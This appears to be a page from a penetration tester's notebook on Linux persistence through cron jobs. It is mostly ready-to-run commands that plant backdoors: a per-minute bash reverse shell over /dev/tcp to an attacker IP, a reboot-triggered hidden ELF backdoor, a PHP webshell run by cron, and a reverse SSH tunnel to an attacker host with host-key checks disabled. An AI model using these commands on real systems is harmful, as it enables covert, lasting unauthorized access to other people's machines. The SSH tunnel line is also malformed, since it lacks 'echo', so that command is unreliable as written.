# Living off the Land
## 01 - Usage

> [!IMPORTANT] Conditions
> Cron job service must be enabled.
> ```
$ systemctl status cron.service
> ```
> ```
$ sudo systemctl start cron.service
> ```
> ```# /etc/init.d/cron start
> ```


Open an editor via crontab.

```
$ sudo crontab -e
```

This will execute every minute to trigger the backdoor.

```
$ sudo echo "* * * * * <commands>" >> /etc/crontab

$ echo "* * * * * <commands>" | crontab -

$ crontab -l
```

## 02 - Callback Implants

Reverse Shell Backdoor

```
$ sudo echo "* * * * * /bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" >> /etc/crontab

$ sudo echo "@reboot nohup /home/<username>/.directory/elf_backdoor" >> /etc/crontab
```

Webshell backdoor

```
$ sudo echo "* * * * * php -f /var/www/html/logout.php" >> /etc/crontab
```

## 03 - Reverse SSH Tunnel

Refer to this [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x08 - Maintaining Access/Persistence/Linux/Remote Login/SSH/Manual/Living off the Land|section]] for more context.

```
$ sudo "* * * * * nohup ssh -i /tmp/keys/id_rsa -NTfCqR [127.0.0.1]:<SOCKS_Proxy> -o \"UserKnownHostsFile=/dev/null StrictHostKeyChecking=no\" <username>@<attacker_IP>" >> /etc/crontab
```

---
## References

- [[Linux Post Exploitation Persistence References]]

- [Crontab GURU](https://crontab.guru)